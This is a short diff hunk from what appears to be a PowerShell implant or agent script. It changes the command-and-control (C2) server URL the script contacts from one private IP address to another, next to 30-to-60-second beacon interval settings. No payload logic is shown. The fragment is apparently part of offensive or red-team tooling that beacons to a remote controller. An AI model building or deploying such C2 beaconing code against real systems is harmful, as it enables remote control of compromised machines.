@@ -11,7 +11,7 @@ function f0()
 
 do{
     # URL address of the C2
-    $url = "http://10.3.0.173:8080"
+    $url = "http://10.210.0.11:8080"
     
     $MinSeconds = 30
     $MaxSeconds = 60
